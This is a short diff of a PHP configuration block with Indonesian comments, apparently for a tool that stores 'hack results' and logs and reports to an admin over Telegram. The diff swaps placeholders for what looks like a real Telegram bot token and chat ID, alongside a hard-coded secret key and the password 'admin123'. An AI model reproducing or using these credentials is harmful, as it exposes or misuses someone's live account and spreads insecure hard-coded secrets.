@@ -11,8 +11,8 @@
 // ========== KONFIGURASI ==========
 $DATA_FILE = 'hack_results.json';
 $LOG_FILE = 'hack_logs.txt';
-$BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Ganti pake token bot lo
-$ADMIN_CHAT_ID = 'YOUR_TELEGRAM_ID_HERE'; // Ganti pake ID Telegram lo
+$BOT_TOKEN = '8765509183:AAFTC2dQY91oYUhDz4MdWOkO5sx4xzdf6vs'; // Ganti pake token bot lo
+$ADMIN_CHAT_ID = '1657790075'; // Ganti pake ID Telegram lo
 $SECRET_KEY = 'L01_XXO_SECRET_2024';
 $PASSWORD = 'admin123'; // Password buat akses dashboard (ganti sesuai keinginan)
 
